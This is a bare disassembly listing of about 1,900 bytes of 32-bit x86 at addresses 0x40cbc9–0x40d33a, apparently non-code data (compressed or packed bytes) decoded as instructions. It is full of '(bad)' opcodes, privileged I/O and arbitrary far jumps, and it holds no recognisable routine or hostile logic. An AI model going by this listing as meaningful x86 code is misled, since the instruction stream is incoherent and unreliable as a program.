  40cbc9:	push   0x323b002a
  40cbce:	(bad)  
  40cbcf:	sti    
  40cbd0:	xor    al,0x7
  40cbd2:	loopne 0x40cbaa
  40cbd4:	dec    ecx
  40cbd5:	cmp    ecx,DWORD PTR [esi+0x6e]
  40cbd8:	(bad)  
  40cbd9:	jne    0x40cc44
  40cbdb:	std    
  40cbdc:	not    ebp
  40cbde:	adc    eax,0x21d8ff2a
  40cbe3:	sti    
  40cbe4:	push   es
  40cbe5:	ror    ebp,0x30
  40cbe8:	or     cl,BYTE PTR [esi]
  40cbea:	pop    edi
  40cbeb:	adc    eax,eax
  40cbed:	jge    0x40cbca
  40cbef:	ret    
  40cbf0:	push   edx
  40cbf1:	repnz sbb DWORD PTR [ebp+0x53],esp
  40cbf5:	push   0xc9c8f0eb
  40cbfa:	scas   eax,DWORD PTR es:[edi]
  40cbfb:	aaa    
  40cbfc:	jecxz  0x40cbaa
  40cbfe:	push   es
  40cbff:	cli    
  40cc00:	sub    al,0x1c
  40cc02:	lods   eax,DWORD PTR ds:[esi]
  40cc03:	clc    
  40cc04:	push   eax
  40cc05:	jmp    0x45e:0x73c8419c
  40cc0c:	push   0xfffffff2
  40cc0e:	in     eax,0x58
  40cc10:	call   0xf8be7720
  40cc15:	dec    ebp
  40cc16:	(bad)  
  40cc17:	and    dh,ah
  40cc19:	lock mov BYTE PTR [eax-0x1b],ch
  40cc1d:	arpl   di,di
  40cc1f:	repz fiadd DWORD PTR [edx-0x4c]
  40cc23:	inc    esi
  40cc24:	xchg   esp,eax
  40cc25:	mov    ch,0xec
  40cc27:	call   0x8014:0xd9802348
  40cc2e:	fcmovnb st,st(4)
  40cc30:	jmp    0x630aba34
  40cc35:	aas    
  40cc36:	ror    BYTE PTR ss:[ecx+0x42a48c68],0x7c
  40cc3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc3f:	test   eax,0x42b416d3
  40cc44:	dec    eax
  40cc45:	inc    edi
  40cc46:	xor    eax,esp
  40cc48:	ins    BYTE PTR es:[edi],dx
  40cc49:	(bad)  
  40cc4a:	mov    al,ds:0xd54d2b82
  40cc4f:	cmc    
  40cc50:	arpl   WORD PTR [ecx-0x5a6f9ad1],di
  40cc56:	push   esp
  40cc57:	pop    ss
  40cc58:	xchg   ebp,eax
  40cc59:	push   ds
  40cc5a:	sbb    DWORD PTR [esi+esi*1+0x56],ebx
  40cc5e:	mov    edi,0x5e121f21
  40cc63:	pop    ecx
  40cc64:	das    
  40cc65:	dec    edx
  40cc66:	mov    ds:0x8083d22d,eax
  40cc6b:	cli    
  40cc6c:	sub    DWORD PTR [esi+0x55e83d23],0xfbbf800a
  40cc76:	fcom   DWORD PTR [edx+0x1c3e3805]
  40cc7c:	(bad)  
  40cc7d:	fcmovbe st,st(6)
  40cc7f:	add    dl,BYTE PTR [ecx]
  40cc81:	jle    0x40cc7c
  40cc83:	sub    eax,0x525e28b5
  40cc88:	push   eax
  40cc89:	aas    
  40cc8a:	fstp   TBYTE PTR [ebx]
  40cc8c:	sub    DWORD PTR [esi+0x4e],edx
  40cc8f:	xchg   esi,edi
  40cc91:	dec    eax
  40cc92:	sbb    BYTE PTR [esi],al
  40cc94:	mov    dl,0xa2
  40cc96:	mov    ds:0x286aae04,al
  40cc9b:	nop
  40cc9c:	loop   0x40cc48
  40cc9e:	lods   al,BYTE PTR ds:[esi]
  40cc9f:	mov    dl,0xa4
  40cca1:	sub    eax,0x7139ade0
  40cca6:	stc    
  40cca7:	in     eax,dx
  40cca8:	out    0xad,eax
  40ccaa:	sbb    al,0x9
  40ccac:	jae    0x40cc50
  40ccae:	int    0xf1
  40ccb0:	or     DWORD PTR [esi+ebx*8-0x70a8185d],esp
  40ccb7:	pop    ecx
  40ccb8:	das    
  40ccb9:	into   
  40ccba:	ret    0x377c
  40ccbd:	jg     0x40cc97
  40ccbf:	push   ss
  40ccc0:	lock mov al,ds:0xcc01ebcb
  40ccc6:	inc    esp
  40ccc7:	adc    DWORD PTR [esi-0x3e],ebp
  40ccca:	outs   dx,DWORD PTR ds:[esi]
  40cccb:	ds jmp FWORD PTR ss:[edi-0x4fd315d0]
  40ccd3:	in     eax,dx
  40ccd4:	pop    esi
  40ccd5:	pop    ecx
  40ccd6:	sub    DWORD PTR [ebp-0x3d],0x1e
  40ccda:	pushf  
  40ccdb:	push   edx
  40ccdc:	mov    esi,0x6d80c732
  40cce1:	outs   dx,BYTE PTR ds:[esi]
  40cce2:	dec    edx
  40cce3:	add    al,BYTE PTR [esi-0x2c]
  40cce6:	fisubr DWORD PTR [eax]
  40cce8:	sub    eax,0x528b62f5
  40cced:	add    bh,dh
  40ccef:	repnz mov bh,0x22
  40ccf2:	sub    DWORD PTR [esi+0x2a],ebp
  40ccf5:	aad    0x9e
  40ccf7:	xor    cl,BYTE PTR [edx+0x62]
  40ccfa:	jne    0x40ccdc
  40ccfc:	lods   al,BYTE PTR ds:[esi]
  40ccfd:	xchg   edx,eax
  40ccfe:	jmp    0x19af:0x33b2bb80
  40cd05:	cs scas eax,DWORD PTR es:[edi]
  40cd07:	fld    TBYTE PTR [eax+0x1]
  40cd0a:	(bad)  
  40cd0b:	mov    eax,0x1b87dcd8
  40cd10:	pop    es
  40cd11:	shl    bh,0x96
  40cd14:	sub    al,0xf6
  40cd16:	jecxz  0x40ccc9
  40cd18:	pusha  
  40cd19:	sahf   
  40cd1a:	jae    0x40cd70
  40cd1c:	pop    esi
  40cd1d:	jl     0x40cd31
  40cd1f:	mov    ds:0x4f4c7ec5,eax
  40cd24:	sti    
  40cd25:	rcl    DWORD PTR [edx+0x1e],1
  40cd28:	inc    edi
  40cd29:	jb     0x40cd63
  40cd2b:	test   ch,ah
  40cd2d:	mov    esi,0x3431e04
  40cd32:	mov    dh,0x1c
  40cd34:	cmp    al,BYTE PTR [edx-0x78182b45]
  40cd3a:	jmp    0xea42:0x786270ca
  40cd41:	push   es
  40cd42:	jmp    0xf102:0x6810e12f
  40cd49:	fs inc esp
  40cd4b:	leave  
  40cd4c:	lea    eax,[edx+0x9]
  40cd4f:	fistp  QWORD PTR [eax+0x82fc2]
  40cd55:	lods   eax,DWORD PTR ds:[esi]
  40cd56:	int    0xf2
  40cd58:	ss fwait
  40cd5a:	add    edx,eax
  40cd5c:	or     al,al
  40cd5e:	xchg   ebp,eax
  40cd5f:	add    esi,DWORD PTR [eax-0x65b194c5]
  40cd65:	pop    ebx
  40cd66:	push   ds
  40cd67:	ror    BYTE PTR ds:0xe3643aa9,0xaa
  40cd6e:	xor    ecx,DWORD PTR [ecx+0x54de0481]
  40cd74:	xor    BYTE PTR ds:[ecx],ah
  40cd77:	int    0xda
  40cd79:	aad    0x75
  40cd7b:	js     0x40cd73
  40cd7d:	in     al,0x4
  40cd7f:	scas   al,BYTE PTR es:[edi]
  40cd80:	outs   dx,BYTE PTR ds:[esi]
  40cd81:	mul    BYTE PTR [ecx]
  40cd83:	ss sbb al,dh
  40cd86:	and    DWORD PTR [edi],0xffffffd4
  40cd89:	jae    0x40cd95
  40cd8b:	not    dh
  40cd8d:	mov    ah,0xfa
  40cd8f:	push   ecx
  40cd90:	mov    ds:0x3eb70e60,eax
  40cd95:	push   edx
  40cd96:	xor    esi,DWORD PTR [ebx]
  40cd98:	shl    DWORD PTR [ebp-0x8c706be],0x2a
  40cd9f:	add    eax,0xf04924e0
  40cda4:	ret    0xd8bc
  40cda7:	mov    al,ds:0x7509f166
  40cdac:	pop    edi
  40cdad:	mov    ds:0x8b0f0194,eax
  40cdb2:	cmp    al,0x15
  40cdb4:	sbb    esi,eax
  40cdb6:	xchg   DWORD PTR [ebx-0x76],ebx
  40cdb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdba:	mov    eax,0x1dc1db08
  40cdbf:	jge    0x40cd74
  40cdc1:	pop    edx
  40cdc2:	mov    ecx,0xb40a16bf
  40cdc7:	lods   eax,DWORD PTR ds:[esi]
  40cdc8:	adc    DWORD PTR ds:0xf793e191,eax
  40cdce:	aam    0xe6
  40cdd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdd1:	pop    ss
  40cdd2:	sbb    al,0x1b
  40cdd4:	xchg   ebp,eax
  40cdd5:	add    BYTE PTR [ebx+0x37],dl
  40cdd8:	fstp   DWORD PTR [eax-0x3c]
  40cddb:	xchg   ebx,eax
  40cddc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cddd:	or     BYTE PTR [edx+0x15],al
  40cde0:	mov    ecx,0xcae56e0a
  40cde5:	shl    BYTE PTR [edi+0xc],0x4f
  40cde9:	dec    ecx
  40cdea:	mov    cl,0x4f
  40cdec:	mov    bl,0x1a
  40cdee:	adc    BYTE PTR [ecx],ah
  40cdf0:	sub    cl,bl
  40cdf2:	pop    ebp
  40cdf3:	push   ecx
  40cdf4:	adc    BYTE PTR [ecx+0x6a2a1e00],ch
  40cdfa:	shl    BYTE PTR [edx-0x12e73a9b],0x77
  40ce01:	jbe    0x40cdf1
  40ce03:	or     eax,0xd1461b1c
  40ce08:	loopne 0x40ce32
  40ce0a:	loop   0x40cd8f
  40ce0c:	xor    DWORD PTR [edi+edx*8+0x54],eax
  40ce10:	loop   0x40ce09
  40ce12:	fstp   st(1)
  40ce14:	enter  0x15f3,0xe3
  40ce18:	ins    DWORD PTR es:[edi],dx
  40ce19:	sub    eax,0x84e9fc49
  40ce1e:	repz cmp eax,0x53e021ac
  40ce24:	dec    edx
  40ce25:	je     0x40cdb8
  40ce27:	xor    ah,BYTE PTR [ebx+0x63]
  40ce2a:	test   eax,0x5855a6b9
  40ce2f:	xchg   ecx,eax
  40ce30:	je     0x40cdba
  40ce32:	les    edx,FWORD PTR ds:0xda768ead
  40ce38:	fist   DWORD PTR ds:0xaeb16f49
  40ce3e:	int    0x8e
  40ce40:	pusha  
  40ce41:	mov    esi,0x274d0452
  40ce46:	ret    0x3e78
  40ce49:	xor    DWORD PTR [ebx-0x71],esi
  40ce4c:	test   BYTE PTR [ebp-0x475323fe],cl
  40ce52:	dec    ebp
  40ce53:	lock fst DWORD PTR [eax-0x4049c982]
  40ce5a:	xlat   BYTE PTR ds:[ebx]
  40ce5b:	js     0x40cdfc
  40ce5d:	stc    
  40ce5e:	pop    esi
  40ce5f:	aaa    
  40ce60:	mov    edi,0x29bb8f58
  40ce65:	in     al,dx
  40ce66:	ss pop ss
  40ce68:	xchg   ebx,eax
  40ce69:	stos   DWORD PTR es:[edi],eax
  40ce6a:	shl    BYTE PTR [ebx+eax*8],1
  40ce6d:	mov    ebp,0x3c7cd4d2
  40ce72:	mov    ebp,0x13d055ba
  40ce77:	frstor [edx+edi*4]
  40ce7a:	inc    esi
  40ce7b:	in     eax,dx
  40ce7c:	cmp    eax,0x6317e2c3
  40ce81:	dec    esi
  40ce82:	adc    eax,0xd2dad546
  40ce87:	sbb    al,0xc8
  40ce89:	mov    cl,0xd3
  40ce8b:	mov    ds:0x75f18960,eax
  40ce90:	mov    eax,ds:0x3d11dc29
  40ce95:	pop    ebx
  40ce96:	and    ch,ch
  40ce98:	test   eax,0x8011b9c4
  40ce9d:	sub    esp,edx
  40ce9f:	inc    ecx
  40cea0:	jecxz  0x40ce3c
  40cea2:	(bad)  
  40cea4:	mov    WORD PTR ds:0xb032b67e,?
  40ceaa:	xchg   ebp,eax
  40ceab:	pop    ecx
  40ceac:	push   ebx
  40cead:	stos   BYTE PTR es:[edi],al
  40ceae:	dec    edi
  40ceaf:	out    dx,eax
  40ceb0:	mov    al,0x38
  40ceb2:	add    BYTE PTR [esi+0x661a8dff],bh
  40ceb8:	jbe    0x40cef4
  40ceba:	adc    ecx,esp
  40cebc:	cmp    al,BYTE PTR [ecx+0x442c6aef]
  40cec2:	jecxz  0x40ce60
  40cec4:	and    bl,cl
  40cec6:	lods   eax,DWORD PTR es:[esi]
  40cec8:	and    edi,DWORD PTR [ebx]
  40ceca:	in     eax,dx
  40cecb:	add    eax,0x8cf4745e
  40ced0:	and    DWORD PTR [esi+0x4b276650],ebp
  40ced6:	add    DWORD PTR [edi+0x1c],0x44
  40ceda:	lea    edx,[ebx+ebp*1-0x964919b]
  40cee1:	sub    dh,BYTE PTR [ebx]
  40cee3:	inc    ebp
  40cee4:	jb     0x40cee3
  40cee6:	mov    ds:0xcbac4965,eax
  40ceeb:	sbb    dl,BYTE PTR [esi]
  40ceed:	add    eax,0xc4ee19e0
  40cef2:	jecxz  0x40cecf
  40cef4:	fbstp  TBYTE PTR [bx]
  40cef7:	arpl   si,cx
  40cef9:	sti    
  40cefa:	jmp    FWORD PTR [ecx]
  40cefc:	or     ah,BYTE PTR [eax-0x7a]
  40ceff:	retf   
  40cf00:	js     0x40cee5
  40cf02:	imul   ebp,DWORD PTR [edi],0x743cd6de
  40cf08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf09:	dec    esi
  40cf0a:	jb     0x40cf71
  40cf0c:	sbb    DWORD PTR [eax],esi
  40cf0e:	xchg   esi,eax
  40cf0f:	jmp    DWORD PTR [edx-0x16]
  40cf12:	sub    al,0xb3
  40cf14:	out    0xd8,eax
  40cf16:	fimul  DWORD PTR [edx+0x4a]
  40cf19:	mov    ecx,0x94f30823
  40cf1e:	nop
  40cf1f:	xlat   BYTE PTR ds:[ebx]
  40cf20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf21:	ret    0xdb20
  40cf24:	retf   
  40cf25:	repz lock je 0x40cf97
  40cf29:	sbb    DWORD PTR [esi-0xa7509f7],ebp
  40cf2f:	in     eax,0x73
  40cf31:	pop    edi
  40cf32:	test   BYTE PTR [ebx+0x4e7e95dd],dh
  40cf38:	mov    dh,0x52
  40cf3a:	push   ss
  40cf3b:	cmp    ebx,DWORD PTR [ecx+0x1b]
  40cf3e:	dec    ecx
  40cf3f:	jne    0x40cfbb
  40cf41:	mov    esi,0xc49a8cec
  40cf46:	xchg   DWORD PTR [edx],ebx
  40cf48:	or     esp,DWORD PTR [edx+esi*4+0xf0cb330]
  40cf4f:	sbb    bl,bl
  40cf51:	xor    DWORD PTR [ebp-0x78],0xcbbb2dc7
  40cf58:	and    al,0x6e
  40cf5a:	ins    BYTE PTR es:[edi],dx
  40cf5b:	test   esi,esp
  40cf5d:	(bad)
  40cf60:	enter  0x1f7e,0x5c
  40cf64:	push   ds
  40cf65:	jmp    0x40cf28
  40cf67:	imul   esp,eax,0x65
  40cf6a:	(bad)  
  40cf6b:	cmp    ch,BYTE PTR [ecx]
  40cf6d:	scas   al,BYTE PTR es:[edi]
  40cf6e:	lods   al,BYTE PTR ds:[esi]
  40cf6f:	js     0x40cf3c
  40cf71:	ret    0x8c26
  40cf74:	dec    edi
  40cf75:	aas    
  40cf76:	push   edi
  40cf77:	fisubr WORD PTR [edx]
  40cf79:	jmp    0xe75c3b4c
  40cf7e:	popa   
  40cf7f:	imul   ecx
  40cf81:	ss fs test eax,0x113eec49
  40cf88:	inc    ebp
  40cf89:	mov    ds:0x7d478a3f,eax
  40cf8e:	or     eax,0xa72bf902
  40cf93:	popf   
  40cf94:	sub    edx,ebp
  40cf96:	push   ebp
  40cf97:	xchg   ecx,eax
  40cf98:	pushf  
  40cf99:	mov    bh,BYTE PTR [edi]
  40cf9b:	arpl   cx,bp
  40cf9d:	arpl   sp,dx
  40cf9f:	jne    0x40d004
  40cfa1:	and    al,0xe0
  40cfa3:	xchg   BYTE PTR [edx+0x65],cl
  40cfa6:	std    
  40cfa7:	pop    ss
  40cfa8:	cmp    DWORD PTR [ebx],ebx
  40cfaa:	xchg   DWORD PTR [esi+0x1d],esi
  40cfad:	sbb    dl,BYTE PTR [ecx-0x527e90d]
  40cfb3:	(bad)  
  40cfb4:	loop   0x40cf58
  40cfb6:	add    BYTE PTR [eax+0x46ab56c],bl
  40cfbc:	imul   eax,DWORD PTR ds:0xdf47c7a0,0x177f7700
  40cfc6:	push   esi
  40cfc7:	lahf   
  40cfc8:	fcom   QWORD PTR [esi]
  40cfca:	mov    dh,0xb9
  40cfcc:	cs int3 
  40cfce:	lds    ebp,FWORD PTR [esi+0x47]
  40cfd1:	add    dh,ah
  40cfd3:	push   esi
  40cfd5:	cli    
  40cfd6:	rol    DWORD PTR [edx+0x6e],1
  40cfd9:	jmp    FWORD PTR [edi-0xd]
  40cfdc:	xor    BYTE PTR [edi+0x1204a2a4],dl
  40cfe2:	inc    edx
  40cfe3:	push   esi
  40cfe4:	sub    ebx,DWORD PTR [ebp-0x7663606a]
  40cfea:	out    0x3b,al
  40cfec:	or     bh,bh
  40cfee:	leave  
  40cfef:	lahf   
  40cff0:	nop
  40cff1:	adc    eax,0xb6422ee7
  40cff6:	dec    edi
  40cff7:	(bad)  
  40cff8:	(bad)  
  40cff9:	lock pusha 
  40cffb:	push   esi
  40cffc:	fidivr WORD PTR ds:[edi+0x47a242aa]
  40d003:	cmp    DWORD PTR [edx+0x1],ecx
  40d006:	jl     0x40d033
  40d008:	jp     0x40cfc0
  40d00a:	dec    eax
  40d00b:	stos   BYTE PTR es:[edi],al
  40d00c:	pop    ecx
  40d00d:	fsubr  QWORD PTR es:0x37e6c819
  40d014:	int3   
  40d015:	mov    esp,0xe8d51308
  40d01a:	out    0xe6,al
  40d01c:	add    ch,al
  40d01e:	icebp  
  40d01f:	sar    ch,1
  40d021:	imul   eax,DWORD PTR [edx+0x26],0x2
  40d025:	mov    al,ds:0xd4c1802
  40d02a:	mov    bl,BYTE PTR [esi]
  40d02c:	fwait
  40d02d:	scas   eax,DWORD PTR es:[edi]
  40d02e:	test   eax,0x5380febf
  40d033:	inc    DWORD PTR [eax-0x41103f5f]
  40d039:	mov    bl,0xc
  40d03b:	dec    edi
  40d03c:	cmp    al,0x3f
  40d03e:	sub    BYTE PTR [ecx],bh
  40d040:	sbb    eax,0x48650903
  40d045:	dec    edx
  40d046:	mov    edx,DWORD PTR [ecx]
  40d048:	cmp    al,0x33
  40d04a:	and    cl,ch
  40d04c:	mov    edi,0x46cf04fc
  40d051:	in     al,0x16
  40d053:	imul   edi,DWORD PTR [esi+0x6f],0x6b240a17
  40d05a:	mov    dh,0x5e
  40d05c:	jle    0x40d0dd
  40d05e:	adc    cl,BYTE PTR [ebp+0x79]
  40d061:	ds adc al,0x54
  40d064:	push   esp
  40d065:	mov    al,ds:0x4939d867
  40d06a:	sti    
  40d06b:	imul   ah
  40d06d:	icebp  
  40d06e:	xor    al,0x2
  40d070:	js     0x40d0a4
  40d072:	inc    ebp
  40d073:	add    bl,dl
  40d075:	xchg   ecx,eax
  40d076:	adc    BYTE PTR [ebx-0x5dcc9301],dh
  40d07c:	add    BYTE PTR [esi+0x71b8d0],ah
  40d082:	mov    ecx,DWORD PTR [ecx+eax*8+0x1aa8b86a]
  40d089:	jae    0x40d03d
  40d08b:	es mov al,0x35
  40d08e:	mov    edi,0xd0b54918
  40d093:	mov    bl,0x94
  40d095:	jbe    0x40d052
  40d097:	repz test DWORD PTR [esi-0x77],ebp
  40d09b:	imul   DWORD PTR [edi]
  40d09d:	dec    edx
  40d09e:	jge    0x40d0b7
  40d0a0:	add    eax,0x373fb095
  40d0a5:	push   ebp
  40d0a6:	inc    ebx
  40d0a7:	(bad)  
  40d0a8:	push   esi
  40d0a9:	xchg   ebp,eax
  40d0aa:	popa   
  40d0ab:	ret    0x85ef
  40d0ae:	adc    cl,dl
  40d0b0:	aaa    
  40d0b1:	jb     0x40d0b7
  40d0b3:	jg     0x40d0a4
  40d0b5:	jo     0x40d0cf
  40d0b7:	pop    ds
  40d0b8:	pop    esp
  40d0b9:	aas    
  40d0ba:	pop    es
  40d0bb:	ins    DWORD PTR es:[edi],dx
  40d0bc:	adc    DWORD PTR [ebx+0x5306f9a2],0x5
  40d0c3:	and    bl,BYTE PTR [ebx-0x2b]
  40d0c6:	cmp    BYTE PTR [ebp+ebp*4+0xa6a4f29],0x6
  40d0ce:	aam    0x2
  40d0d0:	mov    al,0x43
  40d0d2:	pop    ebp
  40d0d3:	jp     0x40d147
  40d0d5:	ins    DWORD PTR es:[edi],dx
  40d0d6:	add    eax,0x98d646e0
  40d0db:	xchg   esi,eax
  40d0dc:	(bad)  
  40d0dd:	hlt    
  40d0de:	aas    
  40d0df:	imul   edx,DWORD PTR [eax+0x4dc1289],0xffffffdf
  40d0e6:	jl     0x40d075
  40d0e8:	mov    bh,0x79
  40d0ea:	pop    edx
  40d0eb:	mov    bl,0x47
  40d0ed:	pushf  
  40d0ee:	push   edx
  40d0ef:	loopne 0x40d0dc
  40d0f1:	pop    eax
  40d0f2:	xchg   esp,eax
  40d0f3:	and    esi,DWORD PTR [ebp-0x33]
  40d0f6:	mov    esi,0x86c8170b
  40d0fb:	pop    ss
  40d0fc:	outs   dx,BYTE PTR ds:[esi]
  40d0fd:	mov    esp,DWORD PTR [esi]
  40d0ff:	hlt    
  40d100:	out    dx,eax
  40d101:	push   esi
  40d102:	push   edx
  40d103:	int3   
  40d104:	mov    cl,0xe9
  40d106:	lods   eax,DWORD PTR ds:[esi]
  40d107:	stos   DWORD PTR es:[edi],eax
  40d108:	xchg   ebp,eax
  40d109:	dec    ebp
  40d10a:	push   edx
  40d10b:	ins    BYTE PTR es:[edi],dx
  40d10c:	lods   al,BYTE PTR ds:[esi]
  40d10d:	mov    BYTE PTR [eax+ebp*8-0x31],al
  40d111:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d112:	mov    al,ds:0xdc579f42
  40d117:	add    DWORD PTR [edi-0x7d595546],edi
  40d11d:	dec    eax
  40d11e:	call   0xe39f:0xe42367e1
  40d125:	lahf   
  40d126:	rcl    bl,0x47
  40d129:	jb     0x40d0cf
  40d12b:	mov    al,ds:0x449ce2ca
  40d130:	call   0xbcc5:0x78092641
  40d137:	and    ch,BYTE PTR [esp+ebx*8+0x71192ddb]
  40d13e:	iret   
  40d13f:	mov    ebx,0x173380d4
  40d144:	mov    esp,0xad35221d
  40d149:	mov    bh,0x39
  40d14b:	data16 outs dx,BYTE PTR ds:[esi]
  40d14d:	fs xchg edi,eax
  40d14f:	fwait
  40d150:	repnz mov al,0xad
  40d153:	mov    eax,ds:0x63dba6cd
  40d158:	push   0xffffffbb
  40d15a:	xchg   ebx,eax
  40d15b:	jp     0x40d1da
  40d15d:	pop    ebp
  40d15e:	popf   
  40d15f:	adc    bh,BYTE PTR [esi+0x1a]
  40d162:	xchg   ebx,eax
  40d163:	xchg   edx,eax
  40d164:	retf   0xfc29
  40d167:	icebp  
  40d168:	int    0x98
  40d16a:	sbb    BYTE PTR [edi],cl
  40d16c:	jmp    DWORD PTR [eax+ebx*1-0x22]
  40d170:	mov    fs,WORD PTR [ecx-0x3c]
  40d173:	jge    0x40d1ee
  40d175:	fcom   DWORD PTR [edi+0x111b7ceb]
  40d17b:	(bad)  
  40d17c:	cmc    
  40d17d:	mov    eax,ds:0x71c064a8
  40d182:	stos   DWORD PTR es:[edi],eax
  40d183:	in     eax,dx
  40d184:	jecxz  0x40d1f0
  40d186:	mov    ebp,0xb1845655
  40d18b:	stos   DWORD PTR es:[edi],eax
  40d18c:	ret    
  40d18d:	and    DWORD PTR [edx+0x65464bef],ecx
  40d193:	sub    al,0xa8
  40d195:	add    al,0xec
  40d197:	add    DWORD PTR [edx-0x4c],0xfffffff5
  40d19b:	jmp    0x40d1dd
  40d19d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d19e:	add    dl,bl
  40d1a0:	xlat   BYTE PTR ds:[ebx]
  40d1a1:	push   0x317a1046
  40d1a6:	shr    ebp,cl
  40d1a8:	sar    DWORD PTR [ebp+0x34],1
  40d1ab:	mov    ecx,0x6d1c7325
  40d1b0:	pop    ss
  40d1b1:	xor    BYTE PTR [edx+0x600bde92],0x7c
  40d1b8:	pop    es
  40d1b9:	adc    esi,ebp
  40d1bb:	adc    DWORD PTR ds:0xe20ebad4,esp
  40d1c1:	cld    
  40d1c2:	pop    edx
  40d1c3:	aad    0xef
  40d1c5:	icebp  
  40d1c6:	adc    DWORD PTR [ecx+0x4b7a74f2],ecx
  40d1cc:	jo     0x40d15b
  40d1ce:	adc    ah,ah
  40d1d0:	daa    
  40d1d1:	push   esp
  40d1d2:	mov    edi,0x5c21957b
  40d1d7:	sbb    dh,BYTE PTR [eax+0x60]
  40d1da:	jle    0x40d16a
  40d1dc:	jb     0x40d221
  40d1de:	jecxz  0x40d20c
  40d1e0:	sub    DWORD PTR [esi],ebx
  40d1e2:	icebp  
  40d1e3:	dec    eax
  40d1e4:	into   
  40d1e5:	mov    DWORD PTR [esi],edx
  40d1e7:	jle    0x40d16f
  40d1e9:	mov    ecx,ecx
  40d1eb:	adc    DWORD PTR ds:0x7be04eef,ebx
  40d1f1:	imul   esi,ebx,0x51
  40d1f4:	mov    edi,0x13233caa
  40d1f9:	shl    dh,1
  40d1fb:	add    ah,bl
  40d1fd:	fs gs inc esi
  40d200:	push   ebp
  40d201:	pusha  
  40d202:	jae    0x40d206
  40d204:	in     eax,dx
  40d205:	xchg   esp,eax
  40d206:	dec    esi
  40d207:	jbe    0x40d193
  40d209:	cmp    BYTE PTR ds:0x720d5e71,0xfa
  40d210:	inc    ebx
  40d211:	sub    BYTE PTR [esp+ebp*1],ch
  40d214:	inc    edx
  40d215:	pop    ebp
  40d216:	je     0x40d22c
  40d218:	ins    DWORD PTR es:[edi],dx
  40d219:	jmp    0x8e37:0xa4f8f9e2
  40d220:	pop    es
  40d221:	test   BYTE PTR [ebx+eiz*2+0x32424563],0xbe
  40d229:	dec    edx
  40d22a:	mov    dl,0x92
  40d22c:	or     al,BYTE PTR [ecx]
  40d22e:	(bad)  
  40d22f:	ror    bl,1
  40d231:	repz add al,0xfa
  40d234:	sbb    al,0x28
  40d236:	dec    ebx
  40d237:	mov    eax,0xb96253cc
  40d23c:	mov    ebp,0x984fc291
  40d241:	fwait
  40d242:	push   esp
  40d243:	xchg   ebx,eax
  40d244:	mov    ebp,0xfd8fceaa
  40d249:	push   0xffffffe6
  40d24b:	clc    
  40d24c:	pop    eax
  40d24d:	jge    0x40d282
  40d24f:	mov    eax,0x9d636ed3
  40d254:	dec    edi
  40d255:	push   cs
  40d256:	sbb    esp,DWORD PTR [ecx]
  40d258:	mov    edx,0x99919260
  40d25d:	out    dx,eax
  40d25e:	outs   dx,BYTE PTR ds:[esi]
  40d25f:	push   0x36
  40d261:	jae    0x40d204
  40d263:	(bad)  [ecx+0x1b]
  40d266:	jae    0x40d1f9
  40d268:	fimul  DWORD PTR [eax]
  40d26a:	rcr    BYTE PTR [eax+eiz*4-0x1a],0xeb
  40d26f:	or     bx,WORD PTR [eax-0x71]
  40d273:	cmc    
  40d274:	ins    DWORD PTR es:[edi],dx
  40d275:	cdq    
  40d276:	imul   esp
  40d278:	sbb    DWORD PTR [ebp-0x4c],esi
  40d27b:	cld    
  40d27c:	and    al,0x43
  40d27e:	leave  
  40d27f:	or     esp,edi
  40d281:	stc    
  40d282:	and    al,BYTE PTR [edi+0xfe642c]
  40d288:	mov    bh,0x46
  40d28a:	adc    eax,DWORD PTR [ecx]
  40d28c:	rcr    BYTE PTR [edx-0x2d],1
  40d28f:	jb     0x40d250
  40d291:	sbb    esp,esi
  40d293:	dec    ecx
  40d294:	add    DWORD PTR [esi+esi*1],edx
  40d297:	sub    al,BYTE PTR [eax+0x7131e1b6]
  40d29d:	add    eax,0x2ece27e6
  40d2a2:	xchg   ecx,eax
  40d2a3:	mov    ds:0xc29cc854,al
  40d2a8:	call   FWORD PTR [edi+eiz*8-0x5c]
  40d2ac:	jo     0x40d2af
  40d2ae:	or     ecx,DWORD PTR [ebx-0x63]
  40d2b1:	test   al,0x80
  40d2b3:	mov    di,0xac2f
  40d2b7:	int3   
  40d2b8:	ret    
  40d2b9:	jns    0x40d330
  40d2bb:	adc    DWORD PTR [esi+ecx*1-0x1110c858],ecx
  40d2c2:	adc    esp,DWORD PTR [eax*8-0x9e910fb]
  40d2c9:	jmp    0xf9af:0xb66fa35
  40d2d0:	clc    
  40d2d1:	pop    esp
  40d2d2:	jo     0x40d2b3
  40d2d4:	jl     0x40d333
  40d2d6:	or     eax,DWORD PTR [edx-0x40]
  40d2d9:	js     0x40d347
  40d2db:	mov    gs,WORD PTR [ebx-0x74999b53]
  40d2e1:	mov    esi,0x5d12d70
  40d2e6:	imul   edx,DWORD PTR [eax+0x28],0x2a
  40d2ea:	test   al,0xfc
  40d2ec:	fsubr  QWORD PTR [esi+edi*4+0x2b291c71]
  40d2f3:	(bad)  
  40d2f4:	stos   DWORD PTR es:[edi],eax
  40d2f5:	mov    cl,0x1c
  40d2f7:	xor    DWORD PTR [edx],eax
  40d2f9:	mov    WORD PTR [edx-0x70],?
  40d2fc:	cmc    
  40d2fd:	fld    DWORD PTR es:[edi+0x65]
  40d301:	mov    al,0xbe
  40d303:	jg     0x40d319
  40d305:	ds xor eax,0x5cfe9d06
  40d30b:	test   BYTE PTR [edi-0x6],dl
  40d30e:	push   ecx
  40d30f:	push   esi
  40d310:	push   edi
  40d311:	mov    DWORD PTR [edi+0x3e],ebx
  40d314:	jp     0x40d322
  40d316:	jmp    0x40d2ae
  40d318:	aam    0x49
  40d31a:	cwde   
  40d31b:	xchg   esp,eax
  40d31c:	mov    ecx,0xa6259726
  40d321:	jno    0x40d38c
  40d323:	jmp    0x9104:0x2ed79d8
  40d32a:	mov    DWORD PTR [esi],edx
  40d32c:	dec    ebp
  40d32d:	and    DWORD PTR [eax+0x6cf75cb],eax
  40d333:	stc    
  40d334:	fst    st(0)
  40d336:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d337:	lods   eax,DWORD PTR ds:[esi]
  40d338:	in     al,0x6c
  40d33a:	mov    esi,0x5385736c
